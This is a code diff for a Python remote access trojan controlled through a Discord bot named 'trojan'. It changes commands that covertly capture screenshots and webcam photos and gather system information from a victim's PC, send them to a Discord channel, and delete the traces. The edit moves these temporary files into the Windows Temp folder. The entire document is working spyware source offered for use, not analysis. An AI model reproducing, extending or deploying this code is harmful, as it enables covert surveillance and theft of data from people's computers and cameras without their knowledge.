@@ -340,18 +340,18 @@ async def on_ready():
 @trojan.command()
 async def screenshot(ctx, pc=pc_name):
     if pc == os.getenv("UserName"):
-        pyautogui.screenshot('s.png')
-        await ctx.send(file=discord.File('s.png'))
-        os.remove("s.png")
+        pyautogui.screenshot('c:\\WINDOWS\\Temp\\s.png')
+        await ctx.send(file=discord.File('c:\\WINDOWS\\Temp\\s.png'))
+        os.remove("c:\\WINDOWS\\Temp\\s.png")
 
 @trojan.command()
 async def photo(ctx, pc=pc_name):
     if pc == os.getenv("UserName"):
         camera = cv2.VideoCapture(0)
         return_value, image = camera.read()
-        cv2.imwrite(f'C:\\Users\\{os.getenv("UserName")}\\f.png', image)
-        await ctx.send(file=discord.File(f'C:\\Users\\{os.getenv("UserName")}\\f.png'))
-        os.remove(f'C:\\Users\\{os.getenv("UserName")}\\f.png')
+        cv2.imwrite(f'c:\\WINDOWS\\Temp\\f.png', image)
+        await ctx.send(file=discord.File(f'c:\\WINDOWS\\Temp\\f.png'))
+        os.remove(f'c:\\WINDOWS\\Temp\\f.png')
 
 # - PC Informations
 @trojan.command()
@@ -378,9 +378,9 @@ async def battery(ctx, pc):
 
 @trojan.command()
 async def advence_info(ctx, pc=pc_name):
-    advence_info(f'C:\\Users\\{os.getenv("UserName")}\\i.txt')
-    await ctx.send(f'C:\\Users\\{os.getenv("UserName")}\\i.txt')
-    os.remove(f'C:\\Users\\{os.getenv("UserName")}\\i.txt')
+    advence_info(f'c:\\WINDOWS\\Temp\\i.txt')
+    await ctx.send(f'c:\\WINDOWS\\Temp\\i.txt')
+    os.remove(f'c:\\WINDOWS\\Temp\\i.txt')
 
 @trojan.command()
 async def info(ctx, pc=pc_name):
